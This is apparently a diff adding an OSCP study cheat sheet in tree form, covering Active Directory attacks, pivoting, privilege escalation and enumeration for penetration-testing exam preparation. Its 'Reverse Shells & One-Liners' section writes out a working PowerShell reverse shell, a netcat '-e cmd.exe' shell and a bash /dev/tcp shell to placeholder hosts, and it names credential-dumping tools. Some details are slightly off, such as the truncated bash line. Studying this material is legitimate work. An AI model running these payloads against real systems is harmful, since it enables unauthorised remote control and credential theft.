@@ -1,0 +1,206 @@
+├──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+├──  OSCP Guide ❤️                                                                                                                                        ────  
+├──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+├── Active Directory  :
+|     ├── User and Group Discovery:
+|     |      ├─  Use Get-ADUser and Get-ADGroup in PowerShell.
+|     |      └─  Identify user accounts, group memberships, and organizational units.
+|     ├── Domain Trusts and Policies:
+|     |      ├─  Employ Get-ADTrust and Get-GPO for trust relationships and policy settings.
+|     |      └─  Understand the domain’s trust relationships and policy configurations.
+|     ├── Service Accounts and Permissions:
+|     |      ├─  Check service accounts with Get-ADServiceAccount.
+|     |      └─  Look for accounts with high privileges or weak configurations.
+|     ├── Common Vulnerabilities:
+|     |      ├─ 1. Kerberoasting:
+|     |      |   ├─  Exploit Service Principal Names (SPNs) to crack passwords offline.
+|     |      |   └─  Identify services vulnerable to Kerberoasting with Set-SPN.
+|     |      ├─ 2. Pass-the-Hash (PtH) Attacks:
+|     |      |   ├─  Capture and reuse NTLM hash values for authentication.
+|     |      |   └─  Tools like Mimikatz can be used for hash extraction.
+|     |      └─ 3. LDAP Injection:
+|     |          ├─  Target improperly sanitized inputs in LDAP queries.
+|     |          └─  Exploit to modify or retrieve information from AD.
+|     ├── Attack Methodologies:
+|     |      ├─ 1. Privilege Escalation:
+|     |      |   ├─  From regular domain user to Domain Admin.
+|     |      |   └─  Abuse misconfigured delegations and permissions.
+|     |      ├─ 2. Lateral Movement:
+|     |      |   ├─  Move across the network using credentials or sessions.
+|     |      |   └─  Utilize techniques like Pass-the-Ticket or Overpass-the-Hash.
+|     |      └─ 3. Persistence Techniques:
+|     |          ├─  Establish footholds via methods like Golden Ticket or AdminSDHolder abuse.
+|     |          └─  Ensure continued access for further exploration or data exfiltration.
+|     └── Essential Tools:
+|           ├─ 1. BloodHound:
+|           |   ├─  Visualize AD environment and identify attack paths.
+|           |   └─  Useful for planning privilege escalation and lateral movement.
+|           ├─ 2. PowerView:
+|           |   ├─  PowerShell tool for AD exploration and enumeration.
+|           |   └─  Perform a wide range of AD reconnaissance activities.
+|           └─ 3. Mimikatz:
+|               ├─  Extract credentials, perform Pass-the-Hash, Overpass-the-Hash, and more.
+|               └─  A versatile tool for various AD attack techniques.
+├── Pivoting :
+|     ├── Linux Pivoting:
+|     |     ├─ 1. SSH Tunneling:
+|     |     |   ├─ Local Port Forwarding: 
+|     |     |   |    └─ ssh -L [local_port]:[target_host]:[target_port] [user]@[pivot_host]
+|     |     |   ├─ Remote Port Forwarding: 
+|     |     |   |    └─ ssh -R [remote_port]:[local_host]:[local_port] [user]@[pivot_host]
+|     |     |   └─ Dynamic Port Forwarding: 
+|     |     |        └─ ssh -D [socks_port] [user]@[pivot_host]
+|     |     ├─ 2. Netcat Relay:
+|     |     |   ├─  Listener: 
+|     |     |   |    └─ nc -lvp [local_port]
+|     |     |   └─  Relay: 
+|     |     |        └─ nc -lvp [another_port] | nc [target_host] [target_port]
+|     |     └─ 3. ProxyChains:
+|     |         ├─ Configure: 
+|     |         |    └─ Edit /etc/proxychains.conf
+|     |         └─ Use: 
+|     |              └─ proxychains [command]
+|     └─ Windows Pivoting:
+|           ├─ 1. Netsh Port Forwarding:
+|           |   └─ Command: 
+|           |       └─ netsh interface portproxy add v4tov4 listenport=[local_port] listenaddress=[local_address] connectport=[target_port] connectaddress=[target_host]
+|           ├─ 2. Plink for SSH Tunneling:
+|           |   └─ Download & Use: 
+|           |       └─ plink.exe -ssh [user]@[pivot_host] -R [remote_port]:[local_host]:[local_port]
+|           └─ 3. Routing with Route:
+|               └─ Add Route: 
+|                   └─ route add [target_network] MASK [subnet_mask] [gateway_ip]
+├── Linux Privilege Escalation:
+|     ├─ 1. Sudo Rights & Tools:
+|     |   └─ Check sudo rights: sudo -l.
+|     |        └─  Use LinEnum.sh or linPEAS for automated enumeration.
+|     ├─ 2. SUID/SGID Executables:
+|     |   ├─  Find SUID binaries: find / -perm -4000 2>/dev/null.
+|     |   └─  Use GTFOBins for exploiting SUID binaries.
+|     ├─ 3. Cron Jobs:
+|     |   ├─ Examine cron jobs: cat /etc/crontab.
+|     |   └─  Automated checks with cronPWN.sh or pspy.
+|     └─ 4. Kernel Exploits:
+|         ├─ Kernel version: uname -r.
+|         └─ Search exploits using searchsploit or Linux Exploit Suggester.
+├── Windows Privilege Escalation:
+|     ├─ 1. Service Misconfigurations:
+|     |   ├─ Inspect services: sc qc.
+|     |   └─ Use PowerUp.ps1 or Windows-Exploit-Suggester for automated analysis.
+|     ├─ 2. Unquoted Service Paths:
+|     |   ├─ Identify services: wmic service get name,displayname,pathname,startmode.
+|     |   └─ Tools: Manual verification or script-based checks.
+|     ├─ 3. Registry Exploits:
+|     |   ├─ Examine registry keys with reg query.
+|     |   └─ Accesschk.exe from Sysinternals to check permissions.
+|     └─ 4. Windows Credentials:
+|         ├─ Extract credentials: Mimikatz.
+|         └─ Password analysis with LaZagne.
+├── Windows Enumeration:
+|     ├─ 1. Basic Commands:
+|     |   ├─ whoami, hostname, net users, ipconfig /all
+|     |   └─ Identify user privileges, network settings, and system information.
+|     ├─ 2. Service and Process Review:
+|     |   ├─ tasklist, net start, sc query
+|     |   └─ Assess running processes and services for potential vulnerabilities.
+|     ├─ 3. File and Directory Permissions:
+|     |   ├─ icacls, dir /q /a
+|     |   └─ Examine file and directory permissions for misconfigurations.
+|     ├─ Common Vulnerabilities:
+|     |   ├─ 1. Unpatched Services:
+|     |   |  ├─ Check outdated services and applications with systeminfo.
+|     |   |  └─ Cross-reference with exploit databases for known vulnerabilities.
+|     |   ├─ 2. Insecure File Permissions:
+|     |   |   ├─ Identify files writable by non-admin users.
+|     |   |   └─ Modify executables or configuration files for exploitation.
+|     |   └─ 3. Weak Passwords and Misconfigurations:
+|     |       ├─ Employ password brute force or guessing.
+|     |       └─ Exploit default configurations and poor security practices.
+|     └─ Attack Methodologies:
+|         ├─ 1. Client-Side Attacks:
+|         |   ├─ Execute malicious payloads through phishing.
+|         |   └─ Target vulnerabilities in client-side applications.
+|         ├─ 2. Privilege Escalation:
+|         |   ├─ Utilize misconfigurations and vulnerabilities for higher access.
+|         |   └─ Tools: 
+|         |       └─ PowerUp.ps1, Windows-Exploit-Suggester.
+|         ├─ 3. Lateral Movement:
+|         |  ├─ Techniques like Pass-the-Hash or trust exploitation.
+|         |  └─ Navigate across the network to reach critical systems.
+|         └─ Reverse Shells & One-Liners:
+|            ├─ 1. PowerShell Reverse Shell:
+|            |   └─ $client = New-Object System.Net.Sockets.TCPClient('[IP]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+|            ├─ 2. nc (Netcat) Reverse Shell:
+|            |   └─ nc.exe -e cmd.exe [IP] [PORT]
+|            └─ 3. Bash One-Liner for Windows:
+|                └─ /bin/bash -i >& /dev/tcp/[IP]/[PORT] 0>&
+├── Linux Enumeration:
+|    ├─ 1. Basic Commands:
+|    |   ├─ whoami, uname -a, ps aux, netstat -antup, ifconfig
+|    |   └─ Gather user, kernel, process, network, and interface information.
+|    ├─ 2. Service and Process Analysis:
+|    |   ├─ ps aux, top, systemctl, service --status-all
+|    |   └─ Understand running processes and services for vulnerabilities.
+|    ├─ 3. File and Directory Permissions:
+|    |   ├─ ls -lah, find / -perm -4000 2>/dev/null, find / -type f -writable 2>/dev/null
+|    |   └─ Check permissions for sensitive files and directories.
+|    ├─ Common Vulnerabilities:
+|    |   ├─ 1. Misconfigured Services:
+|    |   |   ├─ Identify services running as root or with high privileges.
+|    |   |   └─ Check for services with known vulnerabilities.
+|    |   ├─ 2. Weak File Permissions:
+|    |   |   ├─ Look for files and scripts with write permissions for low-privileged users.
+|    |   |   └─ Modify scripts or binaries for privilege escalation.
+|    |   └─ 3. Scheduled Cron Jobs:
+|    |       ├─ Review cron jobs in /etc/crontab, user crontabs.
+|    |       └─ Exploit poorly configured or writable cron jobs.
+|    ├─ Attack Methodologies:
+|    |   ├─ 1. Exploiting SUID and SGID Bits:
+|    |   |   ├─  Identify files with SUID/SGID bits set.
+|    |   |   └─ Use misconfigurations to escalate privileges.
+|    |   ├─ 2. Abusing Service and Process Misconfigurations:
+|    |   |   ├─  Target vulnerable or misconfigured services and processes.
+|    |   |   └─  Exploit these for shell access or privilege escalation.
+|    |   └─ 3. Kernel Exploits:
+|    |       ├─ Check kernel version for known vulnerabilities.
+|    |       └─ Use tools like searchsploit to find applicable exploits.
+|    └─  Essential Tools:
+|        ├─ 1. LinEnum.sh / linPEAS:
+|        |   ├─ Scripts for automated enumeration of Linux systems.
+|        |   └─ Identify common misconfigurations and vulnerable areas.
+|        ├─ 2. GTFOBins:
+|        |   ├─ Online resource listing binaries that can be used to bypass local security restrictions.
+|        |   └─ Useful for finding privilege escalation opportunities.
+|        └─ 3. searchsploit:
+|            ├─ Command-line search tool for Exploit Database.
+|            └─ Find exploits for identified vulnerabilities.
+└── Web Enumeration:
+     ├─ 1. Directory and File Discovery:
+     |   ├─ Tools: dirb, gobuster, wfuzz.
+     |   └─ Identify hidden directories, files, and potential entry points.
+     ├─ 2. Service Identification:
+     |   ├─ Use nikto, nmap scripts for detecting web services.
+     |   └─ Determine versions, configurations, and known vulnerabilities.
+     ├─ 3. Parameter and Input Testing:
+     |   ├─ Employ tools like Burp Suite, OWASP ZAP for parameter fuzzing.
+     |   └─ Identify potential injection points and vulnerabilities.
+     ├─ Network Enumeration:
+     |   ├─ 1. Port Scanning:
+     |   |   ├─ Utilize nmap, masscan for comprehensive port scans.
+     |   |   └─ Identify open ports and associated services.
+     |   ├─ 2. Service Enumeration:
+     |   |   ├─ Delve into services discovered during port scanning.
+     |   |   └─ Use specific tools like enum4linux, smtp-user-enum based on service type.
+     |   └─ 3. Network Topology Mapping:
+     |       ├─ Tools like Zenmap, traceroute for network mapping.
+     |       └─ Understand the network layout and identify key targets.
+     └─ System Enumeration:
+         ├─ 1. OS and Service Version Detection:
+         |   ├─  Commands like uname -a, cat /etc/issue in Linux; systeminfo in Windows.
+         |   └─ Identify potential vulnerabilities associated with versions.
+         ├─ 2. User and Group Discovery:
+         |   ├─ Linux: cat /etc/passwd, id.
+         |   └─ Windows: net users, net localgroup administrators.
+         └─ 3. Scheduled Tasks/Cron Jobs:
+             ├─ Linux: crontab -l, cat /etc/crontab.
+             └─ Windows: schtasks /query, Get-ScheduledTask.
